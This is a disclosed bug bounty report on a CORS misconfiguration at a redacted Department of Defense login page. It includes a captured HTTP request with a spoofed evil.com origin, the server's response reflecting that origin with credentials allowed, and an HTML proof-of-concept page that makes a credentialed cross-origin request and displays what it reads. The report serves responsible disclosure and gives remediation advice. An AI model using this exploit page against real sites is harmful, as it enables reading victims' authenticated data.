# CORS Misconfiguration in https://████████/accounts/login/

## Report Details
- **Report ID**: 1771149
- **URL**: https://hackerone.com/reports/1771149
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-11-11T17:14:03.181Z
- **Disclosed**: 2023-02-24T19:03:23.133Z

## Reporter
- **Username**: deepvvm
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:  Cross-origin resource sharing (CORS) is a browser mechanism that enables controlled access to resources located outside of a given domain. However, it also provides a potential for cross-domain-based attacks, if a website's CORS policy is poorly configured and implemented. CORS can be exploited to trust any arbitrary domain attacker-controlled domain name and send the data to it.  Attackers can make an exploit and ask the domain to send data of the victim to the attacker domain.

As you can see when we run the above request in Burp Suite.
Access-Control-Allow-Origin: evil.com
Access-Control-Allow-Credentials: true

## Impact

An Adversary can carry out a CORS attack to exfiltrate the sensitive details of a victim.

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
First, put any information in the user and password: put any wrong information and send it and pick up the request

you will see the (Origin:) Edit it and put evil.com and it will look like this 

```
POST /accounts/login/ HTTP/1.1

Host: ██████

Cookie: _ga_8P65SJGTV5=GS1.1.1667594184.4.0.1667594184.0.0.0; _ga=GA1.1.1314420854.1667559540; csrftoken=JvozZTiwMukzgt7inOPsCLhG2hVTT98qt7mybOSNtumWh0D3w9xIJS4cOePatlet

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 117

Origin: https://evil.com

Referer: https://█████/accounts/login/

Upgrade-Insecure-Requests: 1

Sec-Fetch-Dest: document

Sec-Fetch-Mode: navigate

Sec-Fetch-Site: same-origin

Sec-Fetch-User: ?1

Te: trailers

Connection: close



csrfmiddlewaretoken=KLecVs84vqKcXOXH0olIf9HCjSIsW9sDuncb7nIlcqMzYlts9J3Ymgu85PCJwlyG&█████
```

response

```
HTTP/1.1 200 OK

Server: nginx/1.23.0

Date: Fri, 11 Nov 2022 16:36:45 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 3371

Connection: close

Expires: Fri, 11 Nov 2022 16:36:45 GMT

Cache-Control: max-age=0, no-cache, no-store, must-revalidate, private

Vary: Cookie, Origin

X-Frame-Options: DENY

Access-Control-Allow-Credentials: true

Access-Control-Allow-Origin: https://evil.com

Access-Control-Expose-Headers: ETag, Last-Modified, Cache-Control, Content-Type, Content-Length, WWW-Authenticate, X-Experience-API-Version, Accept-Language

Set-Cookie: csrftoken=JvozZTiwMukzgt7inOPsCLhG2hVTT98qt7mybOSNtumWh0D3w9xIJS4cOePatlet; expires=Fri, 10 Nov 2023 16:36:45 GMT; Max-Age=31449600; Path=/; SameSite=Lax



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="████'s open █████████">

    <link rel="shortcut icon" href="/static/img/favicon.ico" />
    <link rel="icon" href="/static/img/favicon.ico" type="image/x-icon">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">

    <!--[if lte IE 8]>
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
      <link rel="stylesheet" href="/static/css/marketing-old-ie.css">
    <![endif]-->
    <!--[if gt IE 8]><!-->
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
      <link rel="stylesheet" href="/static/css/marketing.css">
    <!--<![endif]-->
    
<link rel="stylesheet" href="/static/css/extra.css">

    <title>█████████ Login</title>
</head>

<body>
  <div class="header">
    <div class="home-menu pure-menu pure-menu-horizontal pure-menu-fixed">
        <div class="pure-g">
          <div class="pure-u-1-2">
            <!-- <a class="pure-menu-heading" href="/">██████</a> -->
            <a class="pure-menu-heading" href=██████████
          </div>
          <div class="pure-u-1-2">
            <ul class="pure-menu-list">
                
                  <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
                    <a href="/accounts/login/" id="menuLink1" class="pure-menu-link">Login</a>
                    <ul class="pure-menu-children">
                        <li class="pure-menu-item"><a href="/register" class="pure-menu-link">Register</a></li>
                    </ul>
                  </li>
                
            </ul>
          </div>
        </div>
    </div>
  </div>

<br>
<div class="content">
    <div class="pure-g">
      <div class="l-box pure-u-1 pure-u-md-1-3 pure-u-lg-1-3"></div>
      <div class="l-box pure-u-1 pure-u-md-1-3 pure-u-lg-1-3">
        <h3 class="content-subhead">█████ Login</h3>
		
		    <ul class="errorlist nonfield"><li>Please enter a correct username and password. Note that both fields may be case-sensitive.</li></ul>
		      
	    <form class="pure-form pure-form-stacked" method="post">
	        <input type="hidden" name="csrfmiddlewaretoken" value="DeIerTwRSGf8VW9JEFbD6LCLNfcLlldRnQGdDO68zGhvWtFuN0TTdSphzc62VxjU">
	        <fieldset>
	            <legend>Register <a href="/register">here</a> if you're a new user</legend>
	              
	                <label for="id_username">Username</label>
	                
	                  <input id="id_username" name="username" class="pure-input" type="text" required>	                
	                
	              
	                <label for="id_password">Password</label>
	                
	                  <input id="id_password" name="password" class="pure-input" type="password" required>
	                
	              
	            <button type="submit" class="pure-button pure-button-primary">Login</button>
	        </fieldset>
	    </form>
    	<a href="/reset/password_reset/">Forgot your password?</a>
      </div>
      <div class="l-box pure-u-1 pure-u-md-1-3 pure-u-lg-1-3"></div>
    </div>
</div>


</body>
</html>

```

paylod :

``` 
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract SID</h3>
 
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
 
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = alert(this.responseText);
    }
  };
  xhttp.open("GET", "https://██████", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
 
</body>
</html>

```

## Suggested Mitigation/Remediation Actions
All the REST Apis should be authenticated and the domain should not trust any other domains. Allow only selected, trusted domains in the Access-Control-Allow-Origin header.



## Attachments
No attachments
